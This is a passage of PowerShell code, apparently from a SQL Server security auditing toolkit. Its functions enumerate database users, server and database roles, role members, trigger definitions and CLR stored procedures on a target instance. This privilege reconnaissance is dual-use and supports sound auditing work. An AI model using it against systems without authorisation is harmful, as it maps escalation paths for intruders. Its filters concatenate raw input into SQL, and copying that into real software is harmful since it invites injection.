            # Execute Query
            if(-not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Grabbing permissions for the $DbName database..."
            }

            $TblDatabaseTemp = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose

            # Append results
            $TblDatabasePrivs = $TblDatabasePrivs + $TblDatabaseTemp
        }
    }

    End
    {
        # Return data
        $TblDatabasePrivs
    }
}


Function  Get-SQLDatabaseUser
{

    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server database name.')]
        [string]$DatabaseName,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Database user.')]
        [string]$DatabaseUser,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Server login.')]
        [string]$PrincipalName,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Do not show database users associated with default databases.')]
        [Switch]$NoDefaults,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )

    Begin
    {
        # Table for output
        $TblDatabaseUsers = New-Object -TypeName System.Data.DataTable
        $null = $TblDatabaseUsers.Columns.Add('ComputerName')
        $null = $TblDatabaseUsers.Columns.Add('Instance')
        $null = $TblDatabaseUsers.Columns.Add('DatabaseName')
        $null = $TblDatabaseUsers.Columns.Add('DatabaseUserId')
        $null = $TblDatabaseUsers.Columns.Add('DatabaseUser')
        $null = $TblDatabaseUsers.Columns.Add('PrincipalSid')
        $null = $TblDatabaseUsers.Columns.Add('PrincipalName')
        $null = $TblDatabaseUsers.Columns.Add('PrincipalType')
        $null = $TblDatabaseUsers.Columns.Add('deault_schema_name')
        $null = $TblDatabaseUsers.Columns.Add('create_date')
        $null = $TblDatabaseUsers.Columns.Add('is_fixed_role')

        # Setup PrincipalName filter
        if($PrincipalName)
        {
            $PrincipalNameFilter = " and b.name like '$PrincipalName'"
        }
        else
        {
            $PrincipalNameFilter = ''
        }

        # Setup DatabaseUser filter
        if($DatabaseUser)
        {
            $DatabaseUserFilter = " and a.name like '$DatabaseUser'"
        }
        else
        {
            $DatabaseUserFilter = ''
        }
    }

    Process
    {
        # Note: Tables queried by this function typically require sysadmin or DBO privileges.

        # Parse computer name from the instance
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance

        # Default connection to local default instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }


        # Test connection to instance
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if($TestConnection)
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Success."
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }

        # Get list of databases
        if($NoDefaults)
        {
            $TblDatabases = Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -HasAccess -DatabaseName $DatabaseName -SuppressVerbose  -NoDefaults
        }
        else
        {
            $TblDatabases = Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -HasAccess -DatabaseName $DatabaseName -SuppressVerbose
        }

        # Get the privs for each database
        $TblDatabases |
        ForEach-Object -Process {
            # Set DatabaseName filter
            $DbName = $_.DatabaseName

            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Grabbing database users from $DbName."
            }

            # Define Query
            $Query = "  USE $DbName;
                SELECT  '$ComputerName' as [ComputerName],
                '$Instance' as [Instance],
                '$DbName' as [DatabaseName],
                a.principal_id as [DatabaseUserId],
                a.name as [DatabaseUser],
                a.sid as [PrincipalSid],
                b.name as [PrincipalName],
                a.type_desc as [PrincipalType],
                default_schema_name,
                a.create_date,
                a.is_fixed_role
                FROM    [sys].[database_principals] a
                LEFT JOIN [sys].[server_principals] b
                ON a.sid = b.sid WHERE 1=1
                $DatabaseUserFilter
            $PrincipalNameFilter"

            # Execute Query
            $TblDatabaseUsersTemp = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose

            # Update sid formatting for each entry and append results
            $TblDatabaseUsersTemp |
            ForEach-Object -Process {
                # Convert SID to string
                if($_.PrincipalSid.GetType() -eq [System.DBNull])
                {
                    $Sid = ''
                }
                else
                {
                    # Format principal sid
                    $NewSid = [System.BitConverter]::ToString($_.PrincipalSid).Replace('-','')
                    if ($NewSid.length -le 10)
                    {
                        $Sid = [Convert]::ToInt32($NewSid,16)
                    }
                    else
                    {
                        $Sid = $NewSid
                    }
                }

                # Add results to table
                $null = $TblDatabaseUsers.Rows.Add(
                    [string]$_.ComputerName,
                    [string]$_.Instance,
                    [string]$_.DatabaseName,
                    [string]$_.DatabaseUserId,
                    [string]$_.DatabaseUser,
                    $Sid,
                    [string]$_.PrincipalName,
                    [string]$_.PrincipalType,
                    [string]$_.default_schema_name,
                    [string]$_.create_date,
                [string]$_.is_fixed_role)
            }
        }
    }

    End
    {
        # Return data
        $TblDatabaseUsers
    }
}

Function  Get-SQLServerRole
{

    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Role name.')]
        [string]$RolePrincipalName,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = "Role owner's name.")]
        [string]$RoleOwner,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )

    Begin
    {
        # Setup table for output
        $TblServerRoles = New-Object -TypeName System.Data.DataTable
        $null = $TblServerRoles.Columns.Add('ComputerName')
        $null = $TblServerRoles.Columns.Add('Instance')
        $null = $TblServerRoles.Columns.Add('RolePrincipalId')
        $null = $TblServerRoles.Columns.Add('RolePrincipalSid')
        $null = $TblServerRoles.Columns.Add('RolePrincipalName')
        $null = $TblServerRoles.Columns.Add('RolePrincipalType')
        $null = $TblServerRoles.Columns.Add('OwnerPrincipalId')
        $null = $TblServerRoles.Columns.Add('OwnerPrincipalName')
        $null = $TblServerRoles.Columns.Add('is_disabled')
        $null = $TblServerRoles.Columns.Add('is_fixed_role')
        $null = $TblServerRoles.Columns.Add('create_date')
        $null = $TblServerRoles.Columns.Add('modify_Date')
        $null = $TblServerRoles.Columns.Add('default_database_name')

        # Setup owner filter
        if ($RoleOwner)
        {
            $RoleOwnerFilter = " AND suser_name(owning_principal_id) like '$RoleOwner'"
        }
        else
        {
            $RoleOwnerFilter = ''
        }

        # Setup role name
        if ($RolePrincipalName)
        {
            $PrincipalNameFilter = " AND name like '$RolePrincipalName'"
        }
        else
        {
            $PrincipalNameFilter = ''
        }
    }

    Process
    {
        # Note: Tables queried by this function typically require sysadmin privileges to get all rows

        # Parse computer name from the instance
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance

        # Default connection to local default instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Test connection to instance
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if($TestConnection)
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Success."
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }

        # Define Query
        $Query = "SELECT   '$ComputerName' as [ComputerName],
            '$Instance' as [Instance],
            principal_id as [RolePrincipalId],
            sid as [RolePrincipalSid],
            name as [RolePrincipalName],
            type_desc as [RolePrincipalType],
            owning_principal_id as [OwnerPrincipalId],
            suser_name(owning_principal_id) as [OwnerPrincipalName],
            is_disabled,
            is_fixed_role,
            create_date,
            modify_Date,
            default_database_name
            FROM [master].[sys].[server_principals] WHERE type like 'R'
            $PrincipalNameFilter
        $RoleOwnerFilter"

        # Execute Query
        $TblServerRolesTemp = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose

        # Update sid formatting for each entry
        $TblServerRolesTemp |
        ForEach-Object -Process {
            # Format principal sid
            $NewSid = [System.BitConverter]::ToString($_.RolePrincipalSid).Replace('-','')
            if ($NewSid.length -le 10)
            {
                $Sid = [Convert]::ToInt32($NewSid,16)
            }
            else
            {
                $Sid = $NewSid
            }

            # Add results to table
            $null = $TblServerRoles.Rows.Add(
                [string]$_.ComputerName,
                [string]$_.Instance,
                [string]$_.RolePrincipalId,
                $Sid,
                $_.RolePrincipalName,
                [string]$_.RolePrincipalType,
                [string]$_.OwnerPrincipalId,
                [string]$_.OwnerPrincipalName,
                [string]$_.is_disabled,
                [string]$_.is_fixed_role,
                $_.create_date,
                $_.modify_Date,
            [string]$_.default_database_name)
        }
    }

    End
    {
        # Return data
        $TblServerRoles
    }
}

Function  Get-SQLServerRoleMember
{

    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Role name.')]
        [string]$RolePrincipalName,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL login or Windows account name.')]
        [string]$PrincipalName,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )

    Begin
    {
        # Table for output
        $TblServerRoleMembers = New-Object -TypeName System.Data.DataTable

        # Setup role name filter
        if ($RolePrincipalName)
        {
            $RoleOwnerFilter = " AND SUSER_NAME(role_principal_id) like '$RolePrincipalName'"
        }
        else
        {
            $RoleOwnerFilter = ''
        }

        # Setup login name filter
        if ($PrincipalName)
        {
            $PrincipalNameFilter = " AND SUSER_NAME(member_principal_id) like '$PrincipalName'"
        }
        else
        {
            $PrincipalNameFilter = ''
        }
    }

    Process
    {
        # Parse computer name from the instance
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance

        # Default connection to local default instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Test connection to instance
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if($TestConnection)
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Success."
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }

        # Define Query
        $Query = "  SELECT  '$ComputerName' as [ComputerName],
            '$Instance' as [Instance],role_principal_id as [RolePrincipalId],
            SUSER_NAME(role_principal_id) as [RolePrincipalName],
            member_principal_id as [PrincipalId],
            SUSER_NAME(member_principal_id) as [PrincipalName]
            FROM sys.server_role_members WHERE 1=1
            $PrincipalNameFilter
        $RoleOwnerFilter"

        # Execute Query
        $TblServerRoleMembersTemp = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose

        # Append as needed
        $TblServerRoleMembers = $TblServerRoleMembers + $TblServerRoleMembersTemp
    }

    End
    {
        # Return role members
        $TblServerRoleMembers
    }
}


Function  Get-SQLDatabaseRole
{

    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server database name.')]
        [string]$DatabaseName,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Role name.')]
        [string]$RolePrincipalName,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = "Role owner's name.")]
        [string]$RoleOwner,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Only select non default databases.')]
        [switch]$NoDefaults,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )

    Begin
    {
        # Setup table for output
        $TblDatabaseRoles = New-Object -TypeName System.Data.DataTable
        $null = $TblDatabaseRoles.Columns.Add('ComputerName')
        $null = $TblDatabaseRoles.Columns.Add('Instance')
        $null = $TblDatabaseRoles.Columns.Add('DatabaseName')
        $null = $TblDatabaseRoles.Columns.Add('RolePrincipalId')
        $null = $TblDatabaseRoles.Columns.Add('RolePrincipalSid')
        $null = $TblDatabaseRoles.Columns.Add('RolePrincipalName')
        $null = $TblDatabaseRoles.Columns.Add('RolePrincipalType')
        $null = $TblDatabaseRoles.Columns.Add('OwnerPrincipalId')
        $null = $TblDatabaseRoles.Columns.Add('OwnerPrincipalName')
        $null = $TblDatabaseRoles.Columns.Add('is_fixed_role')
        $null = $TblDatabaseRoles.Columns.Add('create_date')
        $null = $TblDatabaseRoles.Columns.Add('modify_Date')
        $null = $TblDatabaseRoles.Columns.Add('default_schema_name')

        # Setup RoleOwner filter
        if ($RoleOwner)
        {
            $RoleOwnerFilter = " AND suser_name(owning_principal_id) like '$RoleOwner'"
        }
        else
        {
            $RoleOwnerFilter = ''
        }

        # Setup RolePrincipalName filter
        if ($RolePrincipalName)
        {
            $RolePrincipalNameFilter = " AND name like '$RolePrincipalName'"
        }
        else
        {
            $RolePrincipalNameFilter = ''
        }
    }

    Process
    {
        # Parse computer name from the instance
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance

        # Default connection to local default instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Test connection to instance
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if($TestConnection)
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Success."
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }

        # Get list of databases
        if($NoDefaults)
        {
            $TblDatabases = Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -HasAccess -DatabaseName $DatabaseName -SuppressVerbose -NoDefaults
        }
        else
        {
            $TblDatabases = Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -HasAccess -DatabaseName $DatabaseName -SuppressVerbose
        }

        # Get role for each database
        $TblDatabases |
        ForEach-Object -Process {
            # Get database name
            $DbName = $_.DatabaseName

            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Getting roles from the $DbName database."
            }

            # Define Query
            $Query = "  USE $DbName;
                SELECT  '$ComputerName' as [ComputerName],
                '$Instance' as [Instance],
                '$DbName' as [DatabaseName],
                principal_id as [RolePrincipalId],
                sid as [RolePrincipalSid],
                name as [RolePrincipalName],
                type_desc as [RolePrincipalType],
                owning_principal_id as [OwnerPrincipalId],
                suser_name(owning_principal_id) as [OwnerPrincipalName],
                is_fixed_role,
                create_date,
                modify_Date,
                default_schema_name
                FROM [$DbName].[sys].[database_principals]
                WHERE type like 'R'
                $RolePrincipalNameFilter
            $RoleOwnerFilter"

            # Execute Query
            $TblDatabaseRolesTemp = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose

            # Update sid formatting for each entry and append results
            $TblDatabaseRolesTemp |
            ForEach-Object -Process {
                # Format principal sid
                $NewSid = [System.BitConverter]::ToString($_.RolePrincipalSid).Replace('-','')
                if ($NewSid.length -le 10)
                {
                    $Sid = [Convert]::ToInt32($NewSid,16)
                }
                else
                {
                    $Sid = $NewSid
                }

                # Add results to table
                $null = $TblDatabaseRoles.Rows.Add(
                    [string]$_.ComputerName,
                    [string]$_.Instance,
                    [string]$_.DatabaseName,
                    [string]$_.RolePrincipalId,
                    $Sid,
                    $_.RolePrincipalName,
                    [string]$_.RolePrincipalType,
                    [string]$_.OwnerPrincipalId,
                    [string]$_.OwnerPrincipalName,
                    [string]$_.is_fixed_role,
                    $_.create_date,
                    $_.modify_Date,
                [string]$_.default_schema_name)
            }
        }
    }

    End
    {
        # Return data
        $TblDatabaseRoles
    }
}


Function  Get-SQLDatabaseRoleMember
{

    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server database name.')]
        [string]$DatabaseName,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Role name.')]
        [string]$RolePrincipalName,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL login or Windows account name.')]
        [string]$PrincipalName,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Only select non default databases.')]
        [switch]$NoDefaults,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )

    Begin
    {
        # Table for output
        $TblDatabaseRoleMembers = New-Object -TypeName System.Data.DataTable

        # Setup login filter
        if ($PrincipalName)
        {
            $PrincipalNameFilter = " AND USER_NAME(member_principal_id) like '$PrincipalName'"
        }
        else
        {
            $PrincipalNameFilter = ''
        }

        # Setup role name
        if ($RolePrincipalName)
        {
            $RolePrincipalNameFilter = " AND USER_NAME(role_principal_id) like '$RolePrincipalName'"
        }
        else
        {
            $RolePrincipalNameFilter = ''
        }
    }

    Process
    {
        # Note: Tables queried by this function typically require sysadmin or DBO privileges.

        # Parse computer name from the instance
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance

        # Default connection to local default instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Test connection to instance
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if($TestConnection)
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Success."
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }

        # Get list of databases
        if($NoDefaults)
        {
            $TblDatabases = Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -HasAccess -DatabaseName $DatabaseName -NoDefaults -SuppressVerbose
        }
        else
        {
            $TblDatabases = Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -HasAccess -DatabaseName $DatabaseName -SuppressVerbose
        }

        # Get roles for each database
        $TblDatabases |
        ForEach-Object -Process {
            # Get database name
            $DbName = $_.DatabaseName

            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Getting role members for the $DbName database..."
            }

            # Define Query
            $Query = "  USE $DbName;
                SELECT  '$ComputerName' as [ComputerName],
                '$Instance' as [Instance],
                '$DbName' as [DatabaseName],
                role_principal_id as [RolePrincipalId],
                USER_NAME(role_principal_id) as [RolePrincipalName],
                member_principal_id as [PrincipalId],
                USER_NAME(member_principal_id) as [PrincipalName]
                FROM [$DbName].[sys].[database_role_members]
                WHERE 1=1
                $RolePrincipalNameFilter
            $PrincipalNameFilter"

            # Execute Query
            $TblDatabaseRoleMembersTemp = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose

            # Append results
            $TblDatabaseRoleMembers = $TblDatabaseRoleMembers + $TblDatabaseRoleMembersTemp
        }
    }

    End
    {
        # Return data
        $TblDatabaseRoleMembers
    }
}


# ----------------------------------
#  Get-SQLTriggerDdl
# ----------------------------------

Function  Get-SQLTriggerDdl
{
 
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Trigger name.')]
        [string]$TriggerName,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )

    Begin
    {
        # Table for output
        $TblDdlTriggers = New-Object -TypeName System.Data.DataTable

        # Setup role name
        if ($TriggerName)
        {
            $TriggerNameFilter = " AND name like '$TriggerName'"
        }
        else
        {
            $TriggerNameFilter = ''
        }
    }

    Process
    {
        # Note: Tables queried by this function typically require sysadmin privileges to get all rows.

        # Parse computer name from the instance
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance

        # Default connection to local default instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Test connection to instance
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if($TestConnection)
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Success."
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }

        # Define Query
        $Query = " SELECT 	'$ComputerName' as [ComputerName],
            '$Instance' as [Instance],
            name as [TriggerName],
            object_id as [TriggerId],
            [TriggerType] = 'SERVER',
            type_desc as [ObjectType],
            parent_class_desc as [ObjectClass],
            OBJECT_DEFINITION(OBJECT_ID) as [TriggerDefinition],
            create_date,
            modify_date,
            is_ms_shipped,
            is_disabled
            FROM [master].[sys].[server_triggers] WHERE 1=1
        $TriggerNameFilter"

        # Execute Query
        $TblDdlTriggersTemp = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose

        # Append results
        $TblDdlTriggers = $TblDdlTriggers  + $TblDdlTriggersTemp
    }

    End
    {
        # Return data
        $TblDdlTriggers
    }
}


# ----------------------------------
#  Get-SQLTriggerDml
# ----------------------------------

Function  Get-SQLTriggerDml
{
  
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server database name.')]
        [string]$DatabaseName,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Trigger name.')]
        [string]$TriggerName,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )

    Begin
    {
        # Table for output
        $TblDmlTriggers = New-Object -TypeName System.Data.DataTable

        # Setup login filter
        if ($TriggerName)
        {
            $TriggerNameFilter = " AND name like '$TriggerName'"
        }
        else
        {
            $TriggerNameFilter = ''
        }
    }

    Process
    {
        # Note: Tables queried by this function typically require sysadmin privileges to get all rows.

        # Parse computer name from the instance
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance

        # Default connection to local default instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Test connection to instance
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if($TestConnection)
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Success."
                Write-Verbose -Message "$Instance : Grabbing DML triggers from the databases below:."
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }

        # Get list of databases
        $TblDatabases = Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -HasAccess -DatabaseName $DatabaseName -SuppressVerbose

        # Get role for each database
        $TblDatabases |
        ForEach-Object -Process {
            # Get database name
            $DbName = $_.DatabaseName

            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : - $DbName"
            }

            # Define Query
            $Query = "  use [$DbName];
                SELECT  '$ComputerName' as [ComputerName],
                '$Instance' as [Instance],
                '$DbName' as [DatabaseName],
                name as [TriggerName],
                object_id as [TriggerId],
                [TriggerType] = 'DATABASE',
                type_desc as [ObjectType],
                parent_class_desc as [ObjectClass],
                OBJECT_DEFINITION(OBJECT_ID) as [TriggerDefinition],
                create_date,
                modify_date,
                is_ms_shipped,
                is_disabled,
                is_not_for_replication,
                is_instead_of_trigger
                FROM [$DbName].[sys].[triggers] WHERE 1=1
                $TriggerNameFilter"

            # Execute Query
            $TblDmlTriggersTemp = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose

            # Append results
            $TblDmlTriggers = $TblDmlTriggers + $TblDmlTriggersTemp
        }
    }

    End
    {
        # Return data
        $TblDmlTriggers
    }
}


Function  Get-SQLStoredProcedureCLR
{

    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server database name.')]
        [string]$DatabaseName,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Filter for filenames.')]
        [string]$AssemblyName,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Folder to export DLLs to.')]
        [string]$ExportFolder,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Do not show database users associated with default databases.')]
        [Switch]$NoDefaults,

